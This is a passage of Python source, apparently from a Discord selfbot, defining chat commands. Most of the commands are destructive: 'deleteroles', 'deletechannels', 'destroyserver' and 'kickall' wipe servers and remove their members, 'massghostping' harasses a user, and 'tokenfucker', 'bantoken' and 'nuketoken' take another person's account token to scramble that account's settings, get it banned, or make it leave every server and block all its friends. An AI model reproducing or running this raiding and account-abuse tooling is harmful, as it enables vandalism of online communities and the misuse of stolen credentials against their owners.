        embed.add_field(name=f'__‚úî Status__', value=f'Deleting all roles.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



        if server_id is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=server_id)
        roles = server.roles

        for role in list(roles):
            try:
                await role.delete()
            except:
                pass
            
    @React.command(usage="deletechannels", description="Deletes all channels on the server")
    async def deletechannels(ctx, server_id: int=None):

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Delete Channels',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Deleting all channels.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
        if server_id is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=server_id)
        channels = server.channels

        for channel in list(channels):
            try:
                await channel.delete()
            except:
                pass
            
    @React.command(usage="masschannels", description="Creates 250 random named channels")
    async def masschannels(ctx, server_id: int=None):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Mass Channels',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Creating 250 channels with random names.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
        if server_id is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=server_id)

        for _i in range(250):
            await server.create_text_channel(name="".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32))))
            
    @React.command(usage="massroles", description="Creates 250 random named roles")
    async def massroles(ctx, server_id: int=None):

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Mass Roles',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Creating 250 roles with random names.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
        if server_id is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=server_id)

        for _i in range(250):
            await server.create_role(name="".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32))), color=discord.Color(random.randint(0x000000, 0xFFFFFF)))

    @React.command(usage="massunban", description="Unbans all users on the server")
    async def massunban(ctx):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Mass Unban',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Unbanning all Members from the guild.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        banlist = await ctx.guild.bans()
        for members in banlist:
            try:
                await asyncio.sleep(2)
                await ctx.guild.unban(user=members.user)
            except Exception:
                pass
                
    @React.command(usage="kickall", description="Kicks all users on the server except yourself")
    async def kickall(ctx):

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Kick all',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Kicking all Members from the guild.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
        members = ctx.channel.members
        for member in members:
            if member is not ctx.author:
                try:
                    await member.kick()
                except Exception:
                    pass

    @React.command(usage="tokenfucker <Token>", description="Changes all settings and let's the Account flicker black and white")
    async def tokenfucker(ctx, tokentofuck: str):
        
        payload = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "invisible"
        }
        
        requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json=payload, headers={'authorization': tokentofuck, 'user-agent': 'Mozilla/5.0'})

        try:
            while True:
                async with httpx.AsyncClient() as client:
                    await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "light"}, headers={'authorization': tokentofuck, 'user-agent': 'Mozilla/5.0'})
                    await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "dark"}, headers={'authorization': tokentofuck, 'user-agent': 'Mozilla/5.0'})
        except Exception:
            return

    @React.command(usage="bantoken <Token>", description="Bans someones Discord Account")
    async def bantoken(ctx, tokentoban: str):

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Ban Token',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Banned the token.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
        try:
            head = {"authorization":tokentoban, "user-agent":"Mozilla/5.0"}
            payload= {}
            while True: 
                requests.put(f"https://canary.discord.com/api/v8/users/@me/relationships/808052697781633025", headers=head, json=payload)
                requests.put(f"https://canary.discord.com/api/v8/users/@me/relationships/808052697781633025", headers=head, json=payload)
                await asyncio.sleep(3)
        except Exception:
            pass

    @React.command(usage="unverify", description="Unverify your email")
    async def unverify(ctx):            
        try:
            async with httpx.AsyncClient() as client:
                await client.get('https://canary.discordapp.com/api/v8/guilds/0/members', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Unverify',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚ùå Discord Unverified__', value=f'Unverified your Discord account E-Mail.', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="timer <Seconds> <Name>", description="Set a timer")
    async def timer(ctx, seconds: int, *, name: str):            
        try:
            seconds_remaining = seconds

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Timer',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚è≥ Time Remaining__', value=f'{seconds_remaining}', inline=False)
            embed.add_field(name=f'__üìõ Name__', value=f'{name}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            msg = await ctx.send(embed=embed)

            while True:
                seconds_remaining -= 1
                if seconds_remaining == 0:
                    break

                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Timer',timestamp=embed_timestamp())
                embed.add_field(name=f'__‚è≥ Time Remaining__', value=f'{seconds_remaining}', inline=False)
                embed.add_field(name=f'__üìõ Name__', value=f'{name}', inline=False)
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])

                await msg.edit(embed = embed)
                await asyncio.sleep(1)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Timer',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚è≥ Time Remaining__', value=f'Timer ended', inline=False)
            embed.add_field(name=f'__üìõ Name__', value=f'{name}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await msg.edit(embed = embed)
            await ctx.send(embed = embed)

        except Exception:
            pass

    @React.command(usage="nuketoken <Token>", description="Purges all guilds and blocks all friends of a Discord Account")
    async def nuketoken(ctx, tokentonuke: str):
        
        try:
            guilds = requests.get('https://canary.discordapp.com/api/v8/users/@me/guilds', headers={'authorization': tokentonuke, 'user-agent': 'Mozilla/5.0'}).json()
            for guild in range(0, len(guilds)):
                guild_id = guilds[guild]['id']
                requests.delete(f'https://canary.discordapp.com/api/v8/users/@me/guilds/{guild_id}', headers={'authorization': tokentonuke, 'user-agent': 'Mozilla/5.0'})
            friends = requests.get('https://canary.discordapp.com/api/v8/users/@me/relationships', headers={'authorization': tokentonuke, 'user-agent': 'Mozilla/5.0'}).json()
            for friend in range(0, len(friends)):
                friend_id = friends[friend]['id']
                requests.put(f'https://canary.discordapp.com/api/v8/users/@me/relationships/{friend_id}', json={'type': 2}, headers={'authorization': tokentonuke, 'user-agent': 'Mozilla/5.0'})
                requests.delete(f'https://canary.discordapp.com/api/v8/channels/{friend_id}', headers={'authorization': tokentonuke, 'user-agent': 'Mozilla/5.0'})
        except Exception:
            pass

    @React.command(usage="leaveallservers", description="Leaves all guilds")
    async def leaveallservers(ctx):
        try:
            guilds = requests.get('https://canary.discordapp.com/api/v8/users/@me/guilds', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
            for guild in range(0, len(guilds)):
                guild_id = guilds[guild]['id']
                requests.delete(f'https://canary.discordapp.com/api/v8/users/@me/guilds/{guild_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
        except Exception:
            pass

    @React.command(usage="deleteallfriends", description="Blocks all friends")
    async def deleteallfriends(ctx):
        try:
            friends = requests.get('https://canary.discordapp.com/api/v8/users/@me/relationships', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
            for friend in range(0, len(friends)):
                friend_id = friends[friend]['id']
                requests.put(f'https://canary.discordapp.com/api/v8/users/@me/relationships/{friend_id}', json={'type': 2}, headers={'authorization': tokentonuke, 'user-agent': 'Mozilla/5.0'})
                requests.delete(f'https://canary.discordapp.com/api/v8/channels/{friend_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
        except Exception:
            pass
        
    @React.command(usage="destroyserver [Server ID]", description="Deletes all channels, roles and kicks/bans all members and creates random channels and roles")
    async def destroyserver(ctx, server_id: int=None):
        
        if server_id is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=server_id)
        channels = server.channels
        roles = server.roles
        members = server.members
        for channel in list(channels):
            try:
                await channel.delete()    
            except:
                pass
        for user in list(members):
            try:
                await user.ban()
            except:
                pass    
        try:
            await server.edit(
                name="".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32))),
                description="destroyed lmao",
                reason="hi",
                icon=None,
                banner=None
            )  
        except:
            pass        
        for _i in range(250):
            await server.create_text_channel(name="".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32))))
        for _i in range(250):
            await server.create_role(name="".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32))), color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
            
        for role in list(roles):
            try:
                await role.delete()
            except:
                pass

    @React.command(usage="makerole <Name>", description="Creates a role")
    async def makerole(ctx, *, name):
        role = await ctx.guild.create_role(name=name, color=discord.Color(random.randint(0x000000, 0xFFFFFF)))
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Make Role',timestamp=embed_timestamp())
        embed.add_field(name=f'__üåà Created Role__', value=f'{role.mention}', inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="renameallroles <Name>", description="Rename all roles")
    async def renameallroles(ctx, *, name: str):
        
        roles = ctx.guild.roles

        for role in list(roles):
            try:
                await role.edit(name=name)
            except Exception:
                pass

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Rename All Roles',timestamp=embed_timestamp())
        embed.add_field(name=f'__üåà Name__', value=f'{name}', inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="renameallchannels <Name>", description="Rename all channels")
    async def renameallchannels(ctx, *, name: str):
        
        channels = ctx.guild.channels

        for channel in list(channels):
            try:
                await channel.edit(name=name)
            except Exception:
                pass

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Rename All Channels',timestamp=embed_timestamp())
        embed.add_field(name=f'__üìÉ Name__', value=f'{name}', inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="purgeserver", description="Deletes all channels and roles")
    async def purgeserver(ctx, server_id: int=None):
        
        if server_id is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=server_id)
        channels = server.channels
        roles = server.roles
        members = server.members
        for channel in list(channels):
            try:
                await channel.delete()    
            except:
                pass
        for role in list(roles):
            try:
                await role.delete()
            except:
                pass   
            
    @React.command(usage="dumpemojis [Server ID]", description="Saves all Emojis into an folder")
    async def dumpemojis(ctx, server_id: int=None):
        try:
            if server_id is None:
                server = ctx.guild
            else: 
                server = discord.utils.get(ctx.bot.guilds, id=server_id)
            
            emojiNum = len(server.emojis)

            folderName = 'Emojis/' + server.name.translate({ord(c): None for c in '/<>:"\\|?*'})

            if emojiNum > 0:
                if not os.path.exists(folderName):
                    os.makedirs(folderName)
            for emoji in server.emojis:

                if emoji.animated:
                    fileName = folderName + '/' + emoji.name + '.gif'

                else:
                    fileName = folderName + '/' + emoji.name + '.png'

                if not os.path.exists(fileName):
                    with open(fileName, 'wb') as outFile:
                        req = urllib.request.Request(emoji.url, headers={'user-agent': 'Mozilla/5.0'})
                        data = urllib.request.urlopen(req).read()
                        outFile.write(data)
        except:
            pass
                    
    @React.command(aliases=['friendexport'], usage="friendbackup", description="Backups __some__ of your friends")
    async def friendbackup(ctx):
        friends = requests.get('https://canary.discordapp.com/api/v8/users/@me/relationships', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
        for friend in range(0, len(friends)):
            friend_id = friends[friend]['id']
            friend_name = friends[friend]['user']['username']
            friend_discriminator = friends[friend]['user']['discriminator']
            friendinfo = f'{friend_name}#{friend_discriminator} ({friend_id})'
            with open('Friends.txt', 'a+') as f:
                f.write(friendinfo+"\n" )

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Friend Backup',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Backed up most of your friends in Friends.txt', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


                
    # @React.command(aliases=['serverexport'])
    # async def serverbackup(ctx):
    #     guilds = requests.get('https://canary.discordapp.com/api/v8/users/@me/guilds', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
    #     print(len(guilds))
    #     for guild in range(0, len(guilds)):
    #         guild_id = guilds[guild]['id']
    #         guild_name = guilds[guild]['name']
    #         guildinfo = f'{guild_name} ({guild_id})'
    #         with open('./Servers.txt', 'a+') as f:
    #             f.write(guildinfo+"\n" )
                
    async def send_ghostping(channel, user: discord.Member):
        try:
            le_message = await channel.send(user.mention)
            await le_message.delete()
        except Exception:
            pass
                
    @React.command(usage="massghostping <User>", description="Ghostpings a person in every channel")
    async def massghostping(ctx, user: discord.User):
        try:
            server = ctx.guild
            channels = server.channels
            
            le_tasks = [send_ghostping(channel, user) for channel in channels]
            await asyncio.wait(le_tasks)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Mass ghostping',timestamp=embed_timestamp())
            embed.add_field(name=f'__üî¥ Mass Ghostpinging__', value=f'{user.mention}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
